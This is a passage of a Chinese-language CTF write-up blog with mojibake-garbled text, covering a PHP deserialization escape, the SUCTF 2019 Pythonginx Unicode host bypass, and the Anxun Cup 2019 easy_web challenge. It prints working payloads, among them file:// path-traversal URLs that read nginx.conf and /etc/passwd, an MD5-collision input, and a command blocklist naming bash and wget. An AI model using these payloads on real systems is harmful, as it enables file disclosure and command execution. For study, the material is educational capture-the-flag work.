<p><code>$user-&gt;update_profile($username, serialize($profile));</code></p>
<p>ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²å¯æ§ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PHPåºåˆ—åŒ–é•¿åº¦å˜åŒ–å¯¼è‡´å­—ç¬¦é€ƒé€¸</span></span><br><span class="line"><span class="comment">//PHPååºåˆ—åŒ–ä¸­å€¼çš„å­—ç¬¦è¯»å–å¤šå°‘å…¶å®æ˜¯ç”±è¡¨ç¤ºé•¿åº¦çš„æ•°å­—æ§åˆ¶çš„ï¼Œè€Œä¸”åªè¦æ•´ä¸ªå­—ç¬¦ä¸²çš„å‰ä¸€éƒ¨åˆ†èƒ½å¤ŸæˆåŠŸååºåˆ—åŒ–ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²åé¢å‰©ä¸‹çš„ä¸€éƒ¨åˆ†å°†ä¼šè¢«ä¸¢å¼ƒ</span></span><br><span class="line">$s = <span class="string">"Hello World"</span>;</span><br><span class="line">$a = <span class="keyword">array</span>($s);</span><br><span class="line">var_dump(serialize($a)); <span class="comment">//string(29) "a:1:&#123;i:0;s:11:"Hello World";&#125;"</span></span><br><span class="line">$fake = <span class="string">'a:1:&#123;i:0;s:7:"Hello "";&#125;World";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($fake)); <span class="comment">//string(7) "Hello ""</span></span><br><span class="line"><span class="comment">//æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒåŸæ¥çš„å­—ç¬¦ä¸²"Hello World"å†… "World"æ”¹æˆäº†ä¸€ä¸ªåŒå¼•å·ï¼Œs:11 æ”¹æˆ s:7 å†æ˜¯æ­£å¸¸ç»“å°¾æ—¶éœ€è¦æœ‰çš„ ";&#125; ä¸‰ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="comment">//åœ¨PHPè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œç”±å­—ç¬¦ä¸²åˆå§‹ä½ç½®å‘åè¯»å–7ä¸ªå­—ç¬¦ï¼Œå³ä½¿é‡åˆ°å­—ç¬¦ä¸²åˆ†è§£ç¬¦å•åŒå¼•å·ä¹Ÿä¼šç»§ç»­å‘ä¸‹è¯»ï¼Œè€Œåé‡åˆ°äº†æ­£å¸¸çš„ç»“æŸç¬¦ï¼Œè¾¾æˆäº†æ­£å¸¸ååºåˆ—åŒ–çš„æ¡ä»¶ï¼Œååºåˆ—åŒ–ç»“æŸï¼Œ</span></span><br><span class="line"><span class="comment">//åé¢çš„ World";&#125;Â  å‡ ä¸ªå­—ç¬¦å‡è¢«ä¸¢å¼ƒã€‚</span></span><br></pre></td></tr></table></figure>

<p>è™½ç„¶<code>$profile[&#39;nickname&#39;]</code>å¯æ§ï¼Œä½†åºåˆ—åŒ–æ˜¯åœ¨æœåŠ¡å™¨ç«¯ï¼Œ<code>s</code>çš„é•¿åº¦æ— æ³•æ§åˆ¶ï¼Œä¹Ÿå°±æ— æ³•é€ƒé€¸</p>
<p>æ…¢æ…¢çœ‹æºç </p>
<p>æ¥ç€åœ¨<code>profile.php</code>è°ƒç”¨äº†</p>
<p><code>$profile=$user-&gt;show_profile($username);</code></p>
<p>è¿™ä¸ª<code>show_proflie()</code>å…·ä½“å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„<code>filter()</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' å’Œ \\ å­—ç¬¦</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' å’Œ \\ æ›¿æ¢æˆ _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//åŒç†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ° <code>$profile</code>å­˜å…¥æ•°æ®åº“æœªè¢«è¿‡æ»¤ï¼Œå–å‡ºæ•°æ®åº“æ—¶å´è¢«è¿‡æ»¤äº†</p>
<p>è€Œå¦‚æœå°†<code>where</code>æ›¿æ¢æˆ <code>hacker</code> ä¾‹å¦‚</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"where"</span> &gt;&gt; <span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"hacker"</span>&gt;&gt;ååºåˆ—åŒ– <span class="selector-tag">hacke</span>ï¼Œ<span class="selector-tag">r</span>åˆ™å¯ä»¥æŒ‰æˆ‘ä»¬çš„æ„æ„¿ä¿®æ”¹ï¼Œè¿™æ ·åœ¨ä¸ä¿®æ”¹<span class="selector-tag">s</span>çš„æƒ…å†µä¸‹ï¼Œæ§åˆ¶äº†ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥çš„æ’å…¥æ•°æ®å…¶å®å’ŒSQLæ³¨å…¥å¾ˆåƒï¼Œåˆ©ç”¨ <code>&quot;;}</code>é—­åˆå‰ä¸€éƒ¨åˆ†ï¼Œæ¥ç€æ³¨å…¥æ•°æ®</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"66666666666"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"test@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">39</span>:<span class="string">"upload/098f6bcd4621d373cade4e832627b4f6"</span>;&#125;'</span><br><span class="line">åœ¨hereåé¢é—­åˆå³</span><br><span class="line">&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;                                                           <span class="string">"&#125;</span></span><br><span class="line"><span class="string">æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="string">&#123;i:0;s:4:"</span>here<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;                            "</span>&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬è¦æ’å…¥ <code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>é•¿åº¦ä¸º34ï¼Œå³æˆ‘ä»¬éœ€è¦34ä¸ªwhere</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phone=<span class="string">"66666666666"</span>;</span><br><span class="line">$email = <span class="string">"test@qq.com"</span>;</span><br><span class="line">$nickname=<span class="keyword">array</span>(<span class="string">'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;'</span>);</span><br><span class="line">$file = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"10"</span>,<span class="string">"name"</span>=&gt;<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $phone))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $email))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $nickname) || strlen($nickname) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile[<span class="string">'phone'</span>] = $phone;</span><br><span class="line">$profile[<span class="string">'email'</span>] = $email;</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $nickname;</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line">var_dump(serialize($profile));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile = <span class="string">'a:4:&#123;s:5:"phone";s:11:"66666666666";s:5:"email";s:11:"test@qq.com";s:8:"nickname";a:1:&#123;i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;";&#125;s:5:"photo";s:39:"upload/098f6bcd4621d373cade4e832627b4f6";&#125;'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' å’Œ \\ å­—ç¬¦</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' å’Œ \\ æ›¿æ¢æˆ _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//åŒç†</span></span><br><span class="line">true&#125;</span><br><span class="line">$profile = filter($profile);</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line">var_dump($profile[<span class="string">'photo'</span>]);</span><br><span class="line">var_dump($photo);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810140642188.png" alt="image-20200810140642188"></p>
<h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><p><code>blackhat</code>è®®é¢˜ä¹‹ä¸€<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/1828215-20200113142549010-1977431520.png" alt="1828215-20200113142549010-1977431520"></p>
<p>æ ¹æ®æºç å†™çˆ†ç ´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65535</span>):</span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line"></span><br><span class="line">                print(parse.quote(chr(x))+<span class="string">" str: "</span> + uni + <span class="string">' unicode: \\u'</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æç¤ºæˆ‘ä»¬æ˜¯nginxï¼Œæ‰€ä»¥æˆ‘ä»¬å»è¯»å–nginxçš„é…ç½®æ–‡ä»¶</p>
<p>è¿™é‡Œè¯»çš„è·¯å¾„æ˜¯ /usr/local/nginx/conf/nginx.conf</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">94</span>cc5e34-bb0b-<span class="number">44</span>bb-b029-ca087a23f0b6.node3.buuoj.cn<span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.c%E2%84%82/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">//u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¯»flagå°±è¡Œ</p>
<p>å¦å¤–ä¸€ç§<a href="https://xz.aliyun.com/t/6281" target="_blank" rel="noopener">æ€è·¯</a>æ˜¯çªç ´<code>urlunsplit</code> </p>
<p>å‡½æ•°å®šä¹‰åœ¨ <code>urllib\parse.py</code> ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span><span class="params">(components)</span>:</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc <span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">'//'</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">'/'</span>: url = <span class="string">'/'</span> + url</span><br><span class="line">        url = <span class="string">'//'</span> + (netloc <span class="keyword">or</span> <span class="string">''</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">':'</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">'?'</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">'#'</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>

<p>ä»é¢˜ç›®æºç ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªå‡½æ•°çš„ç”¨æ³•å¤§æ¦‚å°±æ˜¯æŠŠ <code>url</code> å„ä¸ªéƒ¨åˆ†ç»„æˆ <code>list</code> ä¼ è¿›æ¥ã€‚</p>
<p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p>
<p>è¿™é‡Œçš„ <code>netloc</code> å°±æ˜¯é¢˜ç›®ä¸­æ‹¿æ¥åˆ¤æ–­çš„ <code>host</code>ã€‚</p>
<p>é¦–å…ˆç¬¬ä¸€ä¸ª <code>if</code> åˆ¤æ–­äº† <code>netloc</code> æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸æ˜¯ç©ºå°±è¿›å…¥ä»£ç å—ï¼Œç¬¬äºŒä¸ªæ˜¯åˆ¤æ–­ <code>schema</code> æ˜¯å¦ä¸ºç©ºã€‚ç¬¬ä¸‰ä¸ªç¬¬å››ä¸ªå°±ä¸åˆ†æäº†ã€‚</p>
<p>ä»”ç»†çœ‹çœ‹ç¬¬äºŒä¸ª <code>if</code>ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å¼ºåˆ¶è¦æ±‚ <code>netloc</code> è¦æœ‰ä¸œè¥¿ï¼Œå‡è®¾ä¸€ä¸‹æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªè¿™æ ·çš„ <code>url</code>ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">//</span>abc</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª <code>url</code> ä¼ å…¥å…¥ <code>parse.urlparse</code> æ—¶ï¼Œ<code>netloc</code> æ˜¯ä¸ºç©ºçš„ï¼Œè€Œ <code>path</code> ä¸º <code>//abc</code>ï¼Œå½“è¿›å…¥åˆ° <code>urlunsplit</code> åï¼Œ<code>netloc</code> ä¸ºç©ºä¸è¿›å…¥ç¬¬ä¸€å—ä»£ç ï¼Œ<code>schema</code> ä¸º <code>file</code>ï¼Œè¿›å…¥ç¬¬äºŒä¸ªä»£ç å—ï¼Œæ‹¼æ¥å <code>url</code> å°±å˜æˆäº†ï¼š<code>file://abc</code></p>
<p>æ‰€ä»¥æ„é€ <code>file:////suctf.cc/../../../../../etc/passwd</code></p>
<p>è´´ä¸‹å…¶ä»–nginxé…ç½®æ–‡ä»¶</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">æ¨¡å—ï¼š<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="meta-keyword">/var/</span>log/nginx</span><br></pre></td></tr></table></figure>

<h3 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h3><p>urlæ˜æ˜¾æœ‰æœ‰é—®é¢˜</p>
<p><code>img=TXpVek5UTTFNbVUzTURabE5qYz</code> =&gt; base64 =&gt;base64 =&gt; hex =&gt; 555.png</p>
<p>åè¿‡å» åŠ å¯† <code>index.php</code>ä¸‹è½½æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset($_GET[<span class="string">'img'</span>]) || !isset($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    echo <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    die(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    echo(<span class="string">"forbid ~"</span>);</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>md5å¼ºæ¯”è¾ƒï¼Œå·¥å…·è·‘ä¸€ä¸‹å°±å‡ºæ¥äº†</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%8</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%E2</span><span class="symbol">%0</span>EI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%7</span>EW<span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%16</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span>e<span class="symbol">%5</span>B<span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>EV<span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span>&amp;b=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span 